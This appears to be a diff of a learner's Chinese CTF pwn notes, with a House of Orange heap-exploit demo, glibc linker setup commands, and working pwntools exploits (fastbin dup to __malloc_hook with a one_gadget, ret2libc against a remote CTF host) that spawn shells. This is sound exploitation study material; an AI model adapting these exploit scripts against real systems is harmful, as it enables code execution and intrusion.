@@ -1931,11 +1931,354 @@ gcc -g -O0 -o 1 1.c
 
 size字段已经修改完成
 
+## House of orange
+
+```c
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+
+/*
+  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer
+  It requires a leak of the heap and the libc 
+  <House of Orange 技术利用堆溢出漏洞来篡改 _IO_list_all 指针。它（在利用时）需要堆地址和 libc 地址的泄露。”>
+  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
+*/
+
+/*
+   This function is just present to emulate the scenario where
+   the address of the function system is known.
+   <这个函数仅仅是为了模拟‘已知 system 函数地址’的场景而存在的>
+*/
+int winner ( char *ptr);
+
+int main()
+{
+    /*
+      The House of Orange starts with the assumption that a buffer overflow exists on the heap
+      using which the Top (also called the Wilderness) chunk can be corrupted.
+      
+      At the beginning of execution, the entire heap is part of the Top chunk.
+      The first allocations are usually pieces of the Top chunk that are broken off to service the request.
+      Thus, with every allocation, the Top chunks keeps getting smaller.
+      And in a situation where the size of the Top chunk is smaller than the requested value,
+      there are two possibilities:
+       1) Extend the Top chunk
+       2) Mmap a new page
+
+      If the size requested is smaller than 0x21000, then the former is followed.
+    */
+
+    char *p1, *p2;
+    size_t io_list_all, *top;
+
+    fprintf(stderr, "The attack vector of this technique was removed by changing the behavior of malloc_printerr, "
+        "which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n");
+  
+    fprintf(stderr, "Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,"
+        "https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n");
+
+    /*
+      Firstly, lets allocate a chunk on the heap.
+    */
+
+    p1 = malloc(0x400-16);
+
+    /*
+       The heap is usually allocated with a top chunk of size 0x21000
+       Since we've allocate a chunk of size 0x400 already,
+       what's left is 0x20c00 with the PREV_INUSE bit set => 0x20c01.
+
+       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,
+       it must also be page aligned at the end.
+
+       Also, if a chunk that is adjacent to the Top chunk is to be freed,
+       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.
+
+       So that means that there are two conditions that must always be true.
+        1) Top chunk + size has to be page aligned
+        2) Top chunk's prev_inuse bit has to be set.
+
+       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.
+       What's left is 0x20c01
+
+       Now, let's satisfy the conditions
+       1) Top chunk + size has to be page aligned
+       2) Top chunk's prev_inuse bit has to be set.
+    */
+
+    top = (size_t *) ( (char *) p1 + 0x400 - 16);
+    top[1] = 0xc01;
+
+    /* 
+       Now we request a chunk of size larger than the size of the Top chunk.
+       Malloc tries to service this request by extending the Top chunk
+       This forces sysmalloc to be invoked.
+
+       In the usual scenario, the heap looks like the following
+          |------------|------------|------...----|
+          |    chunk   |    chunk   | Top  ...    |
+          |------------|------------|------...----|
+      heap start                              heap end
+
+       And the new area that gets allocated is contiguous to the old heap end.
+       So the new size of the Top chunk is the sum of the old size and the newly allocated size.
+
+       In order to keep track of this change in size, malloc uses a fencepost chunk,
+       which is basically a temporary chunk.
+
+       After the size of the Top chunk has been updated, this chunk gets freed.
+
+       In our scenario however, the heap looks like
+          |------------|------------|------..--|--...--|---------|
+          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |
+          |------------|------------|------..--|--...--|---------|
+     heap start                            heap end
+
+       In this situation, the new Top will be starting from an address that is adjacent to the heap end.
+       So the area between the second chunk and the heap end is unused.
+       And the old Top chunk gets freed.
+       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,
+       it gets added to list of unsorted bins.
+       Now we request a chunk of size larger than the size of the top chunk.
+       This forces sysmalloc to be invoked.
+       And ultimately invokes _int_free
+
+       Finally the heap looks like this:
+          |------------|------------|------..--|--...--|---------|
+          |    chunk   |    chunk   | free ..  |  ...  | new Top |
+          |------------|------------|------..--|--...--|---------|
+     heap start                                             new heap end
+
+
+
+    */
+
+    p2 = malloc(0x1000);
+    /*
+      Note that the above chunk will be allocated in a different page
+      that gets mmapped. It will be placed after the old heap's end
+
+      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins
+
+
+      Here starts phase two of the attack. We assume that we have an overflow into the old
+      top chunk so we could overwrite the chunk's size.
+      For the second phase we utilize this overflow again to overwrite the fd and bk pointer
+      of this chunk in the unsorted bin list.
+      There are two common ways to exploit the current state:
+        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)
+        - Use the unlinking of the chunk for an *where*-controlled write of the
+          libc's main_arena unsorted-bin-list. (requires at least one allocation)
+
+      The former attack is pretty straight forward to exploit, so we will only elaborate
+      on a variant of the latter, developed by Angelboy in the blog post linked above.
+
+      The attack is pretty stunning, as it exploits the abort call itself, which
+      is triggered when the libc detects any bogus state of the heap.
+      Whenever abort is triggered, it will flush all the file pointers by calling
+      _IO_flush_all_lockp. Eventually, walking through the linked list in
+      _IO_list_all and calling _IO_OVERFLOW on them.
+
+      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose
+      _IO_OVERLOW points to system and whose first 8 bytes are set to '/bin/sh', so
+      that calling _IO_OVERFLOW(fp, EOF) translates to system('/bin/sh').
+      More about file-pointer exploitation can be found here:
+      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/
+
+      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they
+      currently point to the libc's main_arena.
+    */
+
+    io_list_all = top[2] + 0x9a8;
+
+    /*
+      We plan to overwrite the fd and bk pointers of the old top,
+      which has now been added to the unsorted bins.
+
+      When malloc tries to satisfy a request by splitting this free chunk
+      the value at chunk->bk->fd gets overwritten with the address of the unsorted-bin-list
+      in libc's main_arena.
+
+      Note that this overwrite occurs before the sanity check and therefore, will occur in any
+      case.
+
+      Here, we require that chunk->bk->fd to be the value of _IO_list_all.
+      So, we should set chunk->bk to be _IO_list_all - 16
+    */
+ 
+    top[3] = io_list_all - 0x10;
+
+    /*
+      At the end, the system function will be invoked with the pointer to this file pointer.
+      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)
+    */
+
+    memcpy( ( char *) top, "/bin/sh\x00", 8);
+
+    /*
+      The function _IO_flush_all_lockp iterates through the file pointer linked-list
+      in _IO_list_all.
+      Since we can only overwrite this address with main_arena's unsorted-bin-list,
+      the idea is to get control over the memory at the corresponding fd-ptr.
+      The address of the next file pointer is located at base_address+0x68.
+      This corresponds to smallbin-4, which holds all the smallbins of
+      sizes between 90 and 98. For further information about the libc's bin organisation
+      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/
+
+      Since we overflow the old top chunk, we also control it's size field.
+      Here it gets a little bit tricky, currently the old top chunk is in the
+      unsortedbin list. For each allocation, malloc tries to serve the chunks
+      in this list first, therefore, iterates over the list.
+      Furthermore, it will sort all non-fitting chunks into the corresponding bins.
+      If we set the size to 0x61 (97) (prev_inuse bit has to be set)
+      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the
+      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,
+      therefore, occupying the smallbin[4] location in the main_arena and
+      eventually representing the fake file pointer's fd-ptr.
+
+      In addition to sorting, malloc will also perform certain size checks on them,
+      so after sorting the old top chunk and following the bogus fd pointer
+      to _IO_list_all, it will check the corresponding size field, detect
+      that the size is smaller than MINSIZE "size <= 2 * SIZE_SZ"
+      and finally triggering the abort call that gets our chain rolling.
+      Here is the corresponding code in the libc:
+      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717
+    */
+
+    top[1] = 0x61;
+
+    /*
+      Now comes the part where we satisfy the constraints on the fake file pointer
+      required by the function _IO_flush_all_lockp and tested here:
+      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813
+
+      We want to satisfy the first condition:
+      fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
+    */
+
+    FILE *fp = (FILE *) top;
+
+
+    /*
+      1. Set mode to 0: fp->_mode <= 0
+    */
+
+    fp->_mode = 0; // top+0xc0
+
+
+    /*
+      2. Set write_base to 2 and write_ptr to 3: fp->_IO_write_ptr > fp->_IO_write_base
+    */
+
+    fp->_IO_write_base = (char *) 2; // top+0x20
+    fp->_IO_write_ptr = (char *) 3; // top+0x28
+
+
+    /*
+      4) Finally set the jump table to controlled memory and place system there.
+      The jump table pointer is right after the FILE struct:
+      base_address+sizeof(FILE) = jump_table
+
+         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
+    */
+
+    size_t *jump_table = &top[12]; // controlled memory
+    jump_table[3] = (size_t) &winner;
+    *(size_t *) ((size_t) fp + sizeof(FILE)) = (size_t) jump_table; // top+0xd8
+
+
+    /* Finally, trigger the whole chain by calling malloc */
+    malloc(10);
+
+   /*
+     The libc's error message will be printed to the screen
+     But you'll get a shell anyways.
+   */
+
+    return 0;
+}
+
+int winner(char *ptr)
+{ 
+    system(ptr);
+    syscall(SYS_exit, 0);
+    return 0;
+}
+```
+
+修改top_chunk的size之后的话，如果top_chunk的大小不满足申请的大小，那么就会有两种方式扩展
+
+在 Top chunk 的剩余大小**小于**你请求的内存大小时，系统有两种选择：1) 扩展 Top chunk（向系统要更多的内存） 2) 用 `mmap` 映射一块新的内存。
+
+而这个手法就是靠的触发第一个
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 # hitcon_2018_children_tcache（off by null）
 
 ```bash
-patchelf --set-interpreter /home/nan/桌面/pwn/2.27-3ubuntu1_amd64/ld-2.27.so ./pwn
-patchelf --set-rpath /home/nan/桌面/pwn/2.27-3ubuntu1_amd64 ./pwn
+patchelf --set-interpreter /home/nan/桌面/tiaozhan/ld-2.35.so ./pwn
+patchelf --set-rpath /home/nan/桌面/tiaozhan/libc.so.6 ./pwn
+patchelf --set-rpath /home/nan/桌面/tiaozhan/2.23-0ubuntu3_amd64 ./pwn
+patchelf --set-interpreter /home/nan/桌面/pwn/2.23-0ubuntu3_amd64/ld-2.23.so ./note
 ```
 
 因为是ubuntu18所以修改一下相关连接器
@@ -2662,4 +3005,985 @@ free的时候没有报错
 ![image-20261111174952499](assets/image-20261111174952499.png)
 
 再连续申请两次就可以
+
+
+
+
+
+
+
+## 第四次
+
+首先创建4个0x60堆块，然后释放
+
+![image-20261112184055300](assets/image-20261112184055300.png)
+
+然后呢，就只是释放到了tcachebin中
+
+接着又重新创建一个0x60大小堆块，接受堆地址
+
+![image-20261112184445686](assets/image-20261112184445686.png)
+
+![image-20261112184646033](assets/image-20261112184646033.png)
+
+新获得的堆块地址距离堆块开头距离
+
+它的开头又一个大小是0x250大小的堆块
+
+然后又是删除chunk0两次
+
+![image-20261112185339214](assets/image-20261112185339214.png)
+
+这个只是删除一次之后
+
+可是接下来删除第二次之后
+
+![image-20261112185555454](assets/image-20261112185555454.png)
+
+居然tcache链表中就只是剩下了70的链，其他的呢？
+
+接下来申请一个0x60大小的，大小的利用其double free漏洞，修改其fd指针，指向堆的开头
+
+![image-20261112190309214](assets/image-20261112190309214.png)
+
+接下来就是修改其counts数组
+
+```python
+add(6,0x60,b'a')
+payload=b'\x00'*0x20+b'\x07'*(64-0x20)+p64(heap+0x40)
+add(7,0x60,payload)
+```
+
+连续申请，之后的话就直接
+
+![image-20261112193209266](assets/image-20261112193209266.png)
+
+可是那个payload到底干了什么？
+
+这是payload没有写入之前，然后写入查看
+
+![image-20261112193637327](assets/image-20261112193637327.png)
+
+counts数组后面紧跟的就是entry数组
+
+而且是tcache[0x20]的链表头
+
+然后呢，改这里有什么用？
+
+然后又把这个堆块删了
+
+![image-20261112194124275](assets/image-20261112194124275.png)
+
+啥情况啊？
+
+![image-20261112194335050](assets/image-20261112194335050.png)
+
+这个251是一开始就有的，之后的话如果是想的是想要释放相应大小的堆块的话，之后填充7的话，还是理解的，可是之后的，修改emtrys的数组改为40是干啥？
+
+依旧unsoretdbin的切割
+
+# 接收地址
+
+![image-20261118144631002](assets/image-20261118144631002.png)
+
+下面的一行就是程序输出的内容接下来接收
+
+![image-20261118144831313](assets/image-20261118144831313.png)
+
+Int（x,16）
+
+将接收的字符串转化为整数
+
+![image-20261118145953395](assets/image-20261118145953395.png)
+
+接受代码块:
+
+将接受安空格分开，之后再int(x,16)转化
+
+```python
+parts=p.recvline().split()
+canary=int(parts[0],16)
+stack=int(parts[1],16)
+laddr=int(parts[2],16)
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+# 挑战赛
+
+## 1.余像（canary+栈上格式化字符串）
+
+有点晕啊今晚，那就照着ai一步一步
+
+调试
+
+其实已经就是知道栈上泄露的是第六个位置的数据了，之后想要泄露Libc什么的死活泄露不出阿来
+
+![image-20261116205450655](assets/image-20261116205450655.png)
+
+然后就是保护全开之后，检查沙箱保护的话，说实话一开始并不知道，所以也更不可能知道是orw了，
+
+原来的调试脚本
+
+```python
+from pwn import*
+p=process('./pwn')
+e=ELF('./pwn')
+ARCH = 'amd64'
+context(arch=ARCH, os='linux', log_level='debug')
+offset = 6
+gdb.attach(p)
+
+puts_got=e.got['puts']
+payload=p64(puts_got)+b'%6$s'
+p.recvuntil(b">")
+p.sendline(b'1')
+
+p.recvuntil(b'format:\n')
+p.sendline(payload)
+pause()
+
+p.interactive()
+```
+
+![image-20261116210001182](assets/image-20261116210001182.png)
+
+![image-20261116210112189](assets/image-20261116210112189.png)
+
+所以还是问号
+
+首先在程序的检查上面就已经出现了问题，他那个有个函数其实就已经告诉开启了沙箱
+
+![image-20261116213042843](assets/image-20261116213042843.png)
+
+就是这个函数。
+
+![image-20261116205450655](assets/image-20261116205450655.png)
+
+![image-20261116213640607](assets/image-20261116213640607.png)
+
+所以从那一个图里面就知道execve和open的话，那么就可以用openat代替open函数
+
+那就从最简单的开始，就是栈溢出偏移大小，以及漏洞函数入口
+
+![image-20261118095208832](assets/image-20261118095208832.png)
+
+![image-20261118095228117](assets/image-20261118095228117.png)
+
+![image-20261118095317029](assets/image-20261118095317029.png)
+
+可以从上面的preview来格式化字符串
+
+![image-20261118095409190](assets/image-20261118095409190.png)
+
+![image-20261118095846177](assets/image-20261118095846177.png)
+
+居然是从一开始，就把存入的数组看错了
+
+所以偏移就是（0x90+0x8）
+
+之后要做的就是通过格式化字符串泄露数据
+
+可是pie也开了，所以要泄露Libc和canary
+
+你就算出偏移之后再转成10进制，除以8 之后加上6
+
+![image-20261118101233209](assets/image-20261118101233209.png)
+
+23，这个就是canary的地址
+
+![image-20261118102055022](assets/image-20261118102055022.png)
+
+这里也是在canary下断点可是却没有停在漏洞点
+
+因为前面也有调用printf函数的地方
+
+所以应该因为开启了pie所以，直接
+
+b *base+0x155f
+
+又错了
+
+![image-20261118102449234](assets/image-20261118102449234.png)
+
+应该是15ba
+
+又错
+
+```gdb
+b *($base+0x15ba)
+```
+
+
+
+info proc mappings 先运行起来，之后的话直接加上偏移
+
+![image-20261118104347710](assets/image-20261118104347710.png)
+
+0x11+6=23
+
+![image-20261118105255886](assets/image-20261118105255886.png)
+
+
+
+这三个依次是canary 栈地址 Libc地址
+
+可是为什么要泄露这三个地址？
+
+泄露canary是因为栈溢出需要
+
+之后呢？栈地址？libc地址是因为开启了pie。栈地址呢，泄露它干什么？
+
+错了
+
+canary是对的
+
+可是后面的栈地址是因为后面要用orw来读取flag到一个地址 这里是因为开启了pie
+
+之后泄露libc是因为alsr
+
+![image-20261118110418944](assets/image-20261118110418944.png)
+
+这几个依次是canary 栈地址 libc相关地址
+
+然后依次计算相关基址，以及bss地址
+
+![image-20261118151211545](assets/image-20261118151211545.png)
+
+![image-20261118151227265](assets/image-20261118151227265.png)
+
+bss段地址用 IDA 看（Shift+F7 或直接看全局变量地址，
+
+![image-20261118151654816](assets/image-20261118151654816.png)
+
+接下来只需要程序基地址加上就可以
+
+bss段作用：
+
+作为read函数写入flag的地址
+
+怎么选？
+
+gdb里面可以看相关的页权限
+
+![image-20261118152810523](assets/image-20261118152810523.png)
+
+这里+0x4000的就是可以写的
+
+然后
+
+![image-20261118153249588](assets/image-20261118153249588.png)
+
+现在就只是往后+100是空白的，所以往里面去写
+
+接下来就是向里面去触发漏洞函数，写入Paylaod
+
+但是调用orw,还是要首先知道相关函数以及相关指令的
+
+怎么找？
+
+因该是可以直接在虚拟机中用ROPgadget --binary指令去寻找的
+
+![image-20261118185446384](assets/image-20261118185446384.png)
+
+但是其实这里的write函数是限制read的读入大小的
+
+所以原来的链放在这里其实是放不下的
+
+所以需要栈迁移
+
+
+
+更改版本连接器
+
+接下来就是构造chain了
+
+![image-20261120162037048](assets/image-20261120162037048.png)
+
+可是难道就是这样一个一个找吗？
+
+```python
+rop = ROP(libc)
+
+```
+
+glibc-all-in-one用法
+
+![image-20261120164755741](assets/image-20261120164755741.png)
+
+进入到这个页面，之后可以运行一下更新脚本
+
+之后可以downloadlist中的版本
+
+![image-20261120165136551](assets/image-20261120165136551.png)
+
+下完之后我放在同一个目录下
+
+```
+cp 2.35-0ubuntu3_amd64/libc-2..so ./libc.so.6
+cp 2.27-3ubuntu1.6_amd64/ld-2.35.so ./ld-2.35.so
+cp 2.27-3ubuntu1.6_amd64/ld-2.27.so ./ld-2.27.so
+```
+
+```
+patchelf --set-interpreter ./ld-2.27.so ./pwn
+patchelf --set-rpath . ./pwn
+```
+
+换来连接器
+
+他需要的是2.34
+
+```
+cp 2.35-0ubuntu3_amd64/libc.so.6 ./libc.so.6
+cp 2.35-0ubuntu3_amd64/ld-linux-x86-64.so.2 ./ld-2.35.so
+```
+
+```python
+patchelf --set-interpreter ./ld-2.35.so ./pwn
+patchelf --set-rpath . ./pwn
+```
+
+
+
+接着让pwntools自己寻找相关的gadget
+
+```
+rop=ROP('./libc.so.6')
+```
+
+还有
+
+```python
+libc.address=libc_base
+
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+## 2.note
+
+```bash
+cd ~/桌面/tiaozhan
+
+# 1. 补执行权限（之前报"权限不够"就是因为 ld 没有执行位）
+chmod +x note ld-2.23.so
+
+# 2. 让 libc.so.6 这个名字指向真正的 2.23
+ln -sf libc-2.23.so libc.so.6
+
+# 3. interpreter 和 rpath 都用绝对路径，稳妥
+patchelf --set-interpreter "$HOME/桌面/tiaozhan/ld-2.23.so" \
+         --set-rpath "$HOME/桌面/tiaozhan" note
+
+# 4. 验证
+ldd note
+./note
+```
+
+### ld-2.23.so —— 动态链接器（加载器）
+
+二进制运行过程：
+
+1. 内核读 note 文件头，发现里面写着：
+   "我的解释器（interpreter）是 ./ld-2.23.so"     ← 这就是 PT_INTERP 段
+2. 内核先把 ld-2.23.so 加载进内存，把控制权交给它
+3. ld 接管后开始干活：
+   - 读取 note 的依赖清单（"我需要 libc.so.6"）
+   - 按搜索路径找到 libc-2.23.so，加载进内存
+   - 修补所有函数地址（重定位）
+   - 一切就绪后，才跳到 note 的 main 函数开始执行
+
+![image-20261115200711531](assets/image-20261115200711531.png)
+
+#### 接收与计算地址
+
+```bash
+nan@nan-virtual-machine:~/桌面/tiaozhan$ one_gadget ./libc.so.6 
+0x45226 execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4527a execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf03a4 execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1247 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+
+```
+
+![image-20261115212534320](assets/image-20261115212534320.png)
+
+![image-20261115213555334](assets/image-20261115213555334.png)
+
+fastbin申请
+
+前面的链表地址到底这是不是可以申请完之后写入的地址
+
+![image-20261115214041136](assets/image-20261115214041136.png)
+
+![image-20261116164357102](assets/image-20261116164357102.png)
+
+0x7f
+
+成功脚本
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+p = process('./note')          # 远程换 remote(ip, port)
+libc = ELF('./libc-2.23.so')
+
+def add(size, content):
+    p.recvuntil(b'cmd>')
+    p.sendline(b'1')
+    p.recvuntil(b'size>')
+    p.sendline(str(size).encode())
+    p.recvuntil(b'data> ')
+    p.send(content.ljust(size, b'\x00'))    # 补满，避免 read 阻塞
+
+def free(idx):
+    p.recvuntil(b'cmd>'); p.sendline(b'4')
+    p.recvuntil(b'index>'); p.sendline(str(idx).encode())
+
+def show(idx):
+    p.recvuntil(b'cmd>'); p.sendline(b'3')
+    p.recvuntil(b'index>'); p.sendline(str(idx).encode())
+    p.recvuntil(b'data: ')
+    return p.recv(6)
+
+def edit(idx, content):
+    p.recvuntil(b'cmd>'); p.sendline(b'2')      # 注意：原脚本是 b'cmd> '，多了空格
+    p.recvuntil(b'index>'); p.sendline(str(idx).encode())
+    p.recvuntil(b'data> ')
+    p.send(content)
+
+# ---------- 1. 泄漏 libc ----------
+add(0x80, b'a' * 0x80)     # idx0 -> unsorted bin
+add(0x68, b'b' * 0x68)     # idx1 -> 0x70 fastbin  ★改
+add(0x68, b'c' * 0x68)     # idx2                ★改
+free(0)
+leak = u64(show(0).ljust(8, b'\x00'))
+libc_base = leak - 0x3c4b78          # glibc2.23 main_arena+88
+libc.address = libc_base
+log.success('libc_base = %#x' % libc_base)
+
+malloc_hook = libc.sym['__malloc_hook']
+system      = libc.sym['system']
+bash        = next(libc.search(b'/bin/sh\x00'))
+# one_gadget ./libc-2.23.so 逐个试（2.23 常见 4 个）
+one_gadget  = libc_base +0xf1247
+log.info('malloc_hook=%#x system=%#x bash=%#x' % (malloc_hook, system, bash))
+
+# ---------- 2. fastbin dup: 1 -> 2 -> 1 ----------
+free(1)
+free(2)
+free(1)
+
+# ---------- 3. 改写 fastbin 链表 ----------
+fake = malloc_hook - 0x23          # 该处 0x7f 可当 0x70 bin 的合法 size
+add(0x68, p64(fake))               # ① 取回 chunk1，content 前8字节 = 新 fd
+add(0x68, b'x')                    # ② 取回 chunk2
+add(0x68, b'x')                    # ③ 取回 chunk1，head 变成 fake
+# fake chunk 的 user data = malloc_hook - 0x13，填 0x13 字节后正好写 __malloc_hook
+payload = b'A' * 0x13 + p64(one_gadget)
+add(0x68, payload)                 # ④ 分配到 fake，覆盖 __malloc_hook
+
+# ---------- 4. 触发 ----------
+# 任意一次 malloc 都会先调用 __malloc_hook
+p.recvuntil(b'cmd>')
+p.sendline(b'1')
+p.sendline(b'16')
+p.interactive()
+```
+
+![image-20261116170450485](assets/image-20261116170450485.png)
+
+这是一开始创建的堆的结构图
+
+两个0x68
+
+![image-20261116170943757](assets/image-20261116170943757.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+不行：
+
+```python
+from pwn import*
+p=process('./note')
+#gdb.attach(p)
+libc=ELF('./libc-2.23.so')
+context.log_level='debug'
+def add(size, content):
+    p.recvuntil(b'cmd>')
+    p.sendline(b'1')
+    p.recvuntil(b'size>')
+    p.sendline(str(size).encode())
+    p.recvuntil(b'data> ')
+    p.send(content)
+
+def free(idx):
+    p.recvuntil(b'cmd>')
+    p.sendline(b'4')
+    p.recvuntil(b'index>')
+    p.sendline(str(idx).encode())
+
+def show(idx):
+    p.recvuntil(b'cmd>')
+    p.sendline(b'3')
+    p.recvuntil(b'index>')
+    p.sendline(str(idx).encode())
+    p.recvuntil(b'data: ')
+    
+    
+
+def edit(idx, content):
+    p.recvuntil(b'cmd> ')
+    p.sendline(b'2')
+    p.recvuntil(b'index>')
+    p.sendline(str(idx).encode())
+    p.recvuntil(b'data> ')
+    p.send(content)
+    
+gdb.attach(p)
+add(0x80,b'a'*0x80)
+add(0x68,b'b'*0x68)
+add(0x68,b'c'*0x68)
+free(0)
+show(0)
+addr=(p.recv(6).ljust(8,b'\x00'))
+print(u64(addr))
+libc_base=u64(addr)-0x3c4b78
+free(1)
+free(2)
+free(1)
+malloc_hook=libc_base+libc.symbols['__malloc_hook']
+system=libc_base+libc.symbols['system']
+bash=libc_base+next(libc.search(b'/bin/sh\x00'))
+print(malloc_hook)
+print(system)
+print(bash)
+#add(0x60,p64(0).ljust(0x60,b'a'))
+target = malloc_hook - 0x23
+add(0x60, p64(target).ljust(0x60, b'\x00')) 
+#edit(0,p64(malloc_hook-0x13))
+
+ogg=libc_base+0xf1247
+add(0x60,b'a')
+add(0x60,b'b')
+add(0x60,p64(ogg))
+
+
+
+
+
+
+
+
+
+
+#edit(2, b'\x00' * 0x13 + p64(ogg))
+#add(0x60,b'a'*0x60)
+
+#edit(4,b'a'*0x13+p64(ogg))
+
+
+#add(0x10,b'a'*0x10)
+
+
+pause()
+
+
+
+
+
+p.interactive()
+
+```
+
+![image-20261116173637998](assets/image-20261116173637998.png)
+
+这个版本卡在最后，因为可能又输入了内容，然后在接收的时候卡在这里了
+
+### 3.纸库
+
+还是首先更改文件的ld即是动态连接器加权限
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# easy_ret2libc
+
+2026鲲鹏杯
+
+![image-20261120173444416](assets/image-20261120173444416.png)
+
+![image-20261120173555332](assets/image-20261120173555332.png)
+
+没有开什么保护
+
+也是轻松溢出
+
+但是没有system函数，所以还是泄露libc
+
+```
+0x000000000040101a : ret
+0x000000000040117e : pop rdi ; ret
+
+```
+
+里面有puts函数
+
+![image-20261120174520483](assets/image-20261120174520483.png)
+
+![image-20261120174740541](assets/image-20261120174740541.png)
+
+溢出大小：
+
+0x20+0x8
+
+![image-20261120175432477](assets/image-20261120175432477.png)
+
+接收到地址
+
+![image-20261120181505043](assets/image-20261120181505043.png)
+
+脚本
+
+```python
+from pwn import *
+context.log_level = 'debug'
+libc = ELF('./libc.so.6')
+p =remote('nc1.ctfplus.cn',47628)
+elf = ELF('./pwn')
+
+ret = 0x40101a
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+vlun = 0x401183
+pop_rdi = 0x40117e
+
+# ================= 第一次溢出：泄露 puts 真实地址 =================
+pay = b'a' * 0x28
+pay += p64(ret)       # 栈对齐
+pay += p64(pop_rdi)   # 把 puts_got 传给 rdi
+pay += p64(puts_got)
+pay += p64(puts_plt)  # 调用 puts 打印地址
+pay += p64(vlun)      # 返回漏洞函数，准备二次溢出
+
+p.recvuntil(b'name: ')
+p.sendline(pay)
+
+# 接收泄露的地址（注意这里，用 recv(6) 最稳）
+# 假设程序会打印一些废话，再打印地址。如果是直接打印，就直接 recv(6)
+# 你可以根据实际输出情况修改 recvuntil 的字符串
+p.recvuntil(b'you!\n') # 假设泄漏前有这句，如果没有请删掉
+leak_addr = u64(p.recv(6).ljust(8, b'\x00'))
+log.success(f"Puts Leak: {hex(leak_addr)}")
+
+# ================= 计算 Libc 基址 =================
+libc_base = leak_addr - libc.symbols['puts']
+system_addr = libc_base + libc.symbols['system']
+binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
+
+log.success(f"Libc Base: {hex(libc_base)}")
+log.success(f"System: {hex(system_addr)}")
+log.success(f"Binsh: {hex(binsh_addr)}")
+
+# ================= 第二次溢出：执行 system("/bin/sh") =================
+# 注意：此时缓冲区可能还有没接收干净的字符（比如换行符）。
+# 我们直接发送 payload，如果是本地，send 后面加个 pause() 看看
+payload = b'A' * 0x28
+payload += p64(ret)       # 栈对齐
+payload += p64(pop_rdi)   # 传参 /bin/sh
+payload += p64(binsh_addr)
+payload += p64(ret)       # 栈对齐（保证进入 system 时 RSP % 16 == 0）
+payload += p64(system_addr)
+
+# 确认一下是否真的回到了 name: 
+# 如果卡住，可以直接尝试删掉这句 recvuntil
+p.recvuntil(b'name: ') 
+p.sendline(payload)
+
+# 成功拿到 shell
+p.interactive()
+```
+
+```python
+from pwn import*
+context.log_level='debug'
+libc=ELF('./libc.so.6')
+p=process('./pwn')
+elf=ELF('./pwn')
+
+ret=0x40101a
+puts_plt=elf.plt['puts']
+puts_got=elf.got['puts']
+vlun=0x401183
+pop_rdi=0x40117e
+pay=b'a'*0x28+p64(ret)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vlun)
+
+p.recvuntil(b'name: ')
+p.sendline(pay)
+p.recvuntil(b'you!\n')
+leak_addr = u64(p.recv(6).ljust(8, b'\x00')) 
+
+libc_base = leak_addr - libc.symbols['puts']
+system_addr = libc_base + libc.symbols['system']
+binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
+
+payload = b'A' * 0x28+p64(ret)
+payload += p64(pop_rdi) 
+payload += p64(binsh_addr)
+payload += p64(ret)
+payload += p64(system_addr)
+
+p.recvuntil(b'name: ')
+p.sendline(payload)
+
+
+p.interactive()
+```
+
+别跟我说就只是少接受一个\n
+
+直接给你完整exp
+
+```python
+# -*- coding: utf-8 -*-
+"""
+afterimage 最终 exp —— 栈迁移版（glibc 2.35）
+
+为什么需要栈迁移：
+  write() 是循环 read，累计上限 0x130 字节。从 ret addr(buf+0x98) 起只剩
+  0x98=152 字节，放不下完整 orw 链(约 0x100+)。原来 0x198 的 payload 被截断。
+  本脚本：栈上放短链 read(0,bss,0x400) 把长链读进 bss，再 leave;ret 迁过去。
+
+要点：
+  - saved rbp 覆盖成 BSS-8，配合程序自带的 leave;ret(0x127b) 迁移到 BSS
